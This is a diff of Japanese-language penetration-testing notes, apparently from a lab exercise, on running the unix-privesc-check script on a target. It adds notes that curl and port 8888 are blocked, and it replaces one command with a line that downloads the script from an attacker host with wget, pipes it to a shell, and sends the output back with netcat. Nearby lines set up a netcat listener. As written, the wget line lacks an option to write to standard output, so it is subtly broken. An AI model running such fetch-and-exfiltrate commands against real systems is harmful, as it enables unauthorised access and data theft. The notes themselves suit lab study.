@@ -12,7 +12,8 @@ stty raw -echo; fg
 
 # Auto 
 
-*curl は実行できない*
+- *curl は実行できない* (`budybox curl` でも不可)
+- port 8888へは接続できない
 
 ## unix-privesc-check
 
@@ -26,7 +27,7 @@ nc -lvnp 9002 | tee unix-privesc-check.out
 ```
 ```zsh
 # Target
-busybox curl 192.168.45.215:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.215 9002
+wget 192.168.45.215:443/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.215 9002
 ```
 
 ### 実行結果抽出
